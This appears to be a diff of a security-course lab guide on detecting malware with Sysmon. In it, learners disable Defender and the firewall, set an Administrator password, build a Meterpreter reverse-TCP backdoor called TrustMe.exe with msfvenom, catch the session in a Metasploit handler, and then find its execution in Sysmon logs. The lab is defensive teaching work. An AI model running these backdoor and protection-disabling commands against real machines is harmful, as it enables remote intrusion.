@@ -1,178 +1,161 @@
-
 # Sysmon
 
-First, let’s disable Defender. Simply run the following from an Administrator PowerShell prompt:
+Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:
 
-`Set-MpPreference -DisableRealtimeMonitoring $true`
+![](attachments/OpeningPowershell.png)
 
-This will disable Defender for this session.
+Next, run the following command in the **Powershell** terminal:
 
-If you get angry red errors, that is Ok, it means Defender is not running.
+<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
 
-Next, let’s start up the ADHD Linux system and set up our malware and C2 listener: 
+![](attachments/applocker_disabledefender.png)
+This will disable **Defender** for this session.
 
-Let's get started by opening a Terminal as Administrator
+If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
+Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-When you get the User Account Control Prompt, select Yes.
-
-And, open a Ubuntu command prompt:
-
-![](attachments/Clipboard_2020-06-17-08-32-51.png)
-
-####NOTE##### 
-
-If you are having trouble with Windows Terminal, you can simply start each of the three shells, we use by starting them directly from the Windows Start button. 
-
- 
-
-Simply click the Windows Start button in the lower left of your screen and type: 
-
- 
-
-`Powershell` 
-
-or 
-
-`Ubuntu`
-
-or 
-
-`Command Prompt` 
-
- 
-
-For PowerShell and Command Prompt, please right click on them and select Run As Administrator 
-
-###END NOTE###
-
-On your Linux system, please run the following command:
-
-$`ifconfig`
-
-![](attachments/Clipboard_2020-06-12-12-35-15.png)
-
-Please note the IP address of your Ethernet adapter.  
-
-Please note that my adaptor is called eth0 and my IP address is 172.26.19.133.   
-
-Your IP Address and adapter name may be different.
+<pre> netsh advfirewall set allprofiles state off</pre>
 
 
-Now, run the following commands to start a simple backdoor and backdoor listener: 
- 
+Next, set a password for the Administrator account that you can remember
 
- `sudo su -`
-Please note, the adhd password is adhd.
+<pre>net user Administrator password1234</pre>
 
-`msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<YOUR LINUX IP> lport=4444 
--f exe -o /tmp/TrustMe.exe`
+Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-`cd /tmp`
+Before we move on from our Powershell window, lets get our IP by running the following command:
 
-`ls -l TrustMe.exe`
+<pre>ipconfig</pre>
 
-`cp ./TrustMe.exe /mnt/c/tools`
+![](attachments/powershellipconfig.png)
+
+**REMEMBER - YOUR IP WILL BE DIFFERENT**
+
+Write this IP down so we can use it again later.
+
+Let's continue by opening a **Kali** terminal
+
+![](attachments/OpeningKaliInstance.png)
+
+Alternatively, you can click on the **Kali** icon in the taskbar.
+
+![](attachments/TaskbarKaliIcon.png)
 
 
-Now, let's start the Metasploit Handler.  First, open a new Ubuntu Terminal by clicking the down carrot then selecting Ubuntu-18.04.
+We need to run the following commands in order to mount our remote system to the correct directory:
+
+<pre>sudo su -</pre>
+
+<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
+
+**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
+
+If you see the following error, it means that the device is already mounted.
+
+![](attachments/mounterror.png)
+
+If this is the case, ignore it.
+
+Run the following command to navigate into the mounted directory:
+
+<pre>cd /mnt/windows-share</pre>
+
+Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
+
+<pre>ifconfig</pre>
+
+![](attachments/ifconfig.png)
+
+**REMEMBER: YOUR IP WILL BE DIFFERENT**
+
+Run the following commands to start a simple backdoor and backdoor listener: 
+
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+
+Let's start the **Metasploit** Handler.  Open a new **Kali** terminal by clicking the **Kali** icon in the taskbar.
+
+![](attachments/TaskbarKaliIcon.png)
 
 Let's become root.
 
-`sudo su -`
+<pre>sudo su -</pre>
 
+Now let's start the **Metasploit** Handler
 
-root@DESKTOP-I1T2G01:/tmp# `msfconsole -q`
+<pre>msfconsole -q</pre>
 
-msf5 > `use exploit/multi/handler`
+We are going to run the following commands to correctly set the parameters:
 
-msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
+<pre>use exploit/multi/handler</pre>
 
-PAYLOAD => windows/meterpreter/reverse_tcp
+<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+<pre>set LHOST [Your Linux IP Address]</pre>
 
-Remember, your IP will be different!
+Remember, **Your IP will be different!**
 
-msf5 exploit(multi/handler) > `exploit`
-
-
-It should look like this:
-
-![](attachments/Clipboard_2020-06-12-12-46-10.png)
-
-Now, we will need to open an cmd.exe terminal as Administrator.
-
-
-![](attachments/Clipboard_2020-06-12-10-36-44.png)
-
-When you get the pop up select Yes.
-
-Next, to open a Command Prompt Window, select the Down Carrot ![](attachments\Clipboard_2020-06-12-10-38-20.png) and then select Command Prompt.
-
-![](attachments/Clipboard_2020-06-12-10-38-52.png)
-
-Then, type the following:
-
-
-
-C:\Windows\system32>`cd \Tools`
-
-C:\Tools>`Sysmon64.exe -accepteula -i sysmonconfig-export.xml`
-
+<pre>exploit</pre>
 
 It should look like this:
 
-![](attachments/Clipboard_2020-06-15-10-43-37.png)
+![](attachments/msfconsole.png)
 
+We will need to open a **"cmd.exe"** terminal as **Administrator**.
 
-let's run the following commands to run the TrustMe.exe file.
+![](attachments/OpeningWindowsCommandPrompt.png)
 
-`cd \tools`
+<pre>cd \IntroLabs</pre>
+
+<pre>Sysmon64.exe -accepteula -i sysmonconfig-export.xml</pre>
+
+It should look like this:
+
+![](attachments/sysmonexe.png)
+
+let's run the following commands to run the **"TrustMe.exe"** file.
+
+<pre>cd \</pre>
  
- `TrustMe.exe`
+Then run it with the following:
 
+ <pre>TrustMe.exe</pre>
 
-Back at your Ubuntu prompt, you should have a metasploit session!
+Back at your Kali terminal, you should have a metasploit session!
 
-![](attachments/Clipboard_2020-06-12-12-55-11.png)
-
+![](attachments/meterpretersession.png)
 
 Now, we need to view the Sysmon events for this malware:
 
-You will select Event Viewer > Applications and Services Logs > Windows > Sysmon > Operational
+Open **"Event Viewer"** by pressing the Windows key and searching for it.
 
-![](attachments/Clipboard_2020-06-15-10-46-31.png)
+![](attachments/eventviewer.png)
 
+You will select Event Viewer > Applications and Services Logs > Microsoft > Windows > Sysmon > Operational
 
-        …………………………………………………………….
+![](attachments/eventviewernav1.png)
 
-![](attachments/Clipboard_2020-06-15-10-47-01.png)
+You'll have to scroll down a bit until you find the **Sysmon** folder.  
 
+![](attachments/eventviwernav2.png)
 
-Start at the top and work down through the logs, you should see your malware executing.  Please note your paths may be different.
+Start at the top and work down through the logs, you should see your **malware** executing.  Please note your paths may be different.
 
-![](attachments/Clipboard_2020-07-09-16-04-23.png)
+![](attachments/logs.png)
 
-![](attachments/Clipboard_2020-07-09-16-04-40.png)
+![](attachments/processcreateview.png)
 
+***
+***Continuing on to the next Lab?***
 
+[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
 
-
-
-
-
-
-
-
-
+***Finished with the Labs?***
 
 
+Please be sure to destroy the lab environment!
 
+[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
-
-
-
-
+---
 
